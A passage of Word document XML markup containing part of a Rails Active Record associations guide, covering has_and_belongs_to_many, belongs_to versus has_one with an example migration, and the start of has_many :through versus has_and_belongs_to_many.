        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6144"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="4920C37F" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="57355E75" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35759DA0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C2CC4E9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account_history, :through</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C8B0AEA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D2E9EFA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6095D335" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6ED471CA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :supplier</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="671E54E8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account_history</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11AC324F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1612B501" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66B69298" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>AccountHistory &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0522CA02" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22AC5AB6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="08F8AEA4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7B043591" wp14:editId="6B8803F8">
            <wp:extent cx="6029325" cy="7391400"/>
            <wp:effectExtent l="19050" t="0" r="9525" b="0"/>
            <wp:docPr id="15" name="图片 15" descr="has_one :through Associ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s_one :through Association Diagram"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId210" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6029325" cy="7391400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="47507257" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.6 The </w:t>
      </w:r>
      <w:r w:rsidRPr="008B367F">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743F4640" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association creates a direct many-to-many connection with another model, with no intervening model. For example, if your application includes assemblies and parts, with each assembly having many parts and each part appearing in many assemblies, you could declare the models this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4896"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="433BF674" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A76EC80" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Assembly &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F5BD006" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :parts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00487B1B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77A77746" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E97A8AC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Part &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B2EBA75" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AB3EA9A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6E6A982E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C0D2A84" wp14:editId="0024F9AD">
            <wp:extent cx="5867400" cy="6038850"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="16" name="图片 16" descr="has_and_belongs_to_many Associ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s_and_belongs_to_many Association Diagram"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId211" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5867400" cy="6038850"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5D06F6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.7 Choosing Between </w:t>
      </w:r>
      <w:r w:rsidRPr="008B367F">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="008B367F">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE0D4B9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to set up a one-to-one relationship between two models, you’ll need to add </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to one, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the other. How do you know which is which?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254D9061" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The distinction is in where you place the foreign key (it goes on the table for the class declaring the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association), but you should give some thought to the actual meaning of the data as well. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> relationship says that one of something is yours – that is, that something points back to you. For example, it makes more sense to say that a supplier owns an account than that an account owns a supplier. This suggests that the correct relationships are like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="60CCB634" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BA8A48B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FBD3106" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="180EACCB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="060793BC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BBB384F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="086C2491" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :supplier</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37C37783" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2876CC06" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The corresponding migration might look like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5784"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="5AB0B9B7" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="707DC191" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>CreateSuppliers &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2377CB24" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45B8FA78" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_table :suppliers</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|t|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="646DB7FD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.string  :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6038626A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E245FDC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="047E7595" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="027195F2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_table :accounts</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|t|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A921CF6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.integer :supplier_id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="326DDE1D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.string  :account_number</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BEED9B9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55236A38" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AAEC248" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D601920" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="48D17A32" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>t.integer :supplier_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> makes the foreign key naming obvious and explicit. In current versions of Rails, you can abstract away this implementation detail by using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>t.references :supplier</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2749AC67" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.8 Choosing Between </w:t>
      </w:r>
      <w:r w:rsidRPr="008B367F">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="008B367F">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5067B5E5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails offers two different ways to declare a many-to-many relationship between models. The simpler way is to use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t>, which allows you to make the association directly:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4896"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1D4B7E61" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35BA0129" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Assembly &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BCB5C1C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :parts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03996C53" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FDD70F0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D427749" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
